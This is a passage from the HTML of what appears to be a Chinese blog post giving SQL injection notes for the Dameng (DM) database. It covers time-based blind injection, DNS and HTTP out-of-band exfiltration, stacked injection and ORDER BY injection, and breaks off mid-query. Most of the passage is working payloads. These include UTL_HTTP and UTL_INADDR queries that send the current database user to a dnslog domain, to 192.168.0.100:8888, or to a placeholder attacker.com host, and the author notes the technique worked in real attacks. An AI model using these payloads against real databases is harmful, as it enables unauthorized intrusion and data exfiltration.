+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w">				</span><span class="c1">-- 休眠n秒，不能和select 一起用，语法错误，失去价值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">exec</span><span class="w">  </span><span class="n">sleep</span><span class="w"> </span><span class="mi">5</span><span class="w">		</span><span class="c1">-- 延时5s
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">dbms_pipe</span><span class="p">.</span><span class="n">receive_message</span><span class="p">((</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="mi">2</span><span class="p">)</span><span class="w">				</span><span class="c1">-- 可以延时
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">UTL_INADDR</span><span class="p">.</span><span class="n">get_host_name</span><span class="p">(</span><span class="s1">&#39;10.0.0.1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">dual</span><span class="p">;</span><span class="w"> 		</span><span class="c1">-- 如果反查很慢，可能可以
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">UTL_INADDR</span><span class="p">.</span><span class="n">get_host_address</span><span class="p">(</span><span class="s1">&#39;blah.attacker.com&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">dual</span><span class="p">;</span><span class="w"> 		</span><span class="c1">-- 如果正查很慢
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">REQUEST</span><span class="p">(</span><span class="s1">&#39;http://google.com&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">dual</span><span class="p">;</span><span class="w"> 		</span><span class="c1">-- 如果发送TCP包被拦截或者很慢</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>实际过程中时间盲注很难起到作用。测试发现，结合布尔判断时，无论True/False，都会造成延时。</p>
+<h2 id="0x09-dns外带注入" class="heading-element"><span>0x09 DNS外带注入</span>
+  <a href="#0x09-dns%e5%a4%96%e5%b8%a6%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>需要用户可访问网络的权限</p>
+<p>如果数据长度太长，如数据库版本，可能会导致出错，这时候要使用带外，就可以使用substr()函数来截取字符串，每次取几个特定的字符即可</p>
+<p><strong>发送DNS请求，DNS外带</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">UTL_INADDR</span><span class="p">.</span><span class="n">get_host_address</span><span class="p">(</span><span class="s1">&#39;google.com&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">dual</span><span class="p">;</span><span class="w">   </span><span class="c1">-- priv
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">UTL_INADDR</span><span class="p">.</span><span class="n">get_host_address</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">)</span><span class="o">||</span><span class="s1">&#39;.xxx.dnslog&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">REQUEST</span><span class="p">(</span><span class="s1">&#39;http://google.com&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">dual</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">REQUEST</span><span class="p">(</span><span class="s1">&#39;http://xxx.dnslog?&#39;</span><span class="o">||</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">dual</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">utl_http</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;http://192.168.0.100:8888/?&#39;</span><span class="o">||</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">dual</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x0a-堆叠注入" class="heading-element"><span>0x0A 堆叠注入</span>
+  <a href="#0x0a-%e5%a0%86%e5%8f%a0%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>在靶场中没成功，提示<code>表不存在</code>，但是在实战中成功过。</p>
+<h3 id="101-结合dns外带" class="heading-element"><span>10.1 结合DNS外带</span>
+  <a href="#101-%e7%bb%93%e5%90%88dns%e5%a4%96%e5%b8%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>结合DNS外带注入，成功获取到数据。</p>
+<p><img loading="lazy" src="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000324-9dde058c-b8a2-1.png" alt="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000324-9dde058c-b8a2-1.png" srcset="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000324-9dde058c-b8a2-1.png?size=small, /posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000324-9dde058c-b8a2-1.png?size=medium 1.5x, /posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000324-9dde058c-b8a2-1.png?size=large 2x" data-title="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000324-9dde058c-b8a2-1.png" style="--width: 1270px;--aspect-ratio: 1270 / 542;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000338-a653ad84-b8a2-1.png" alt="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000338-a653ad84-b8a2-1.png" srcset="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000338-a653ad84-b8a2-1.png?size=small, /posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000338-a653ad84-b8a2-1.png?size=medium 1.5x, /posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000338-a653ad84-b8a2-1.png?size=large 2x" data-title="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000338-a653ad84-b8a2-1.png" style="--width: 1246px;--aspect-ratio: 1246 / 305;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="102-结合除0报错" class="heading-element"><span>10.2 结合除0报错</span>
+  <a href="#102-%e7%bb%93%e5%90%88%e9%99%a40%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000402-b4cc5a14-b8a2-1.png" alt="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000402-b4cc5a14-b8a2-1.png" srcset="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000402-b4cc5a14-b8a2-1.png?size=small, /posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000402-b4cc5a14-b8a2-1.png?size=medium 1.5x, /posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000402-b4cc5a14-b8a2-1.png?size=large 2x" data-title="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000402-b4cc5a14-b8a2-1.png" style="--width: 2776px;--aspect-ratio: 2776 / 1082;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000414-bba5dc84-b8a2-1.png" alt="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000414-bba5dc84-b8a2-1.png" srcset="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000414-bba5dc84-b8a2-1.png?size=small, /posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000414-bba5dc84-b8a2-1.png?size=medium 1.5x, /posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000414-bba5dc84-b8a2-1.png?size=large 2x" data-title="/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/resource/index.assets/20241213000414-bba5dc84-b8a2-1.png" style="--width: 2266px;--aspect-ratio: 2266 / 590;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="0x0b-order-by-位置注入" class="heading-element"><span>0x0B order by 位置注入</span>
+  <a href="#0x0b-order-by-%e4%bd%8d%e7%bd%ae%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="111-位运算符" class="heading-element"><span>11.1 位运算符</span>
+  <a href="#111-%e4%bd%8d%e8%bf%90%e7%ae%97%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>主要使用^亦或运算，其他也可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="o">^</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="o">^</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="o">^</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="o">^</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="o">&amp;</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="o">|</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="112-union" class="heading-element"><span>11.2 union</span>
+  <a href="#112-union" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>利用条件比较苛刻，需要整条语句在括号中，且前后字段数量一致</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(SELECT * FROM t1 where rownum&lt;5 ORDER BY id) union (select 1,2,user);
+</span></span><span class="line"><span class="cl">(SELECT * FROM t1 where rownum&lt;5 ORDER BY id,null) union (select 1,2,user);</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="113-转化成where" class="heading-element"><span>11.3 转化成Where</span>
+  <a href="#113-%e8%bd%ac%e5%8c%96%e6%88%90where" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>将其转化为 where 后的注入点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xxxx</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">is_delete</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xxxx</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">is_delete</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span 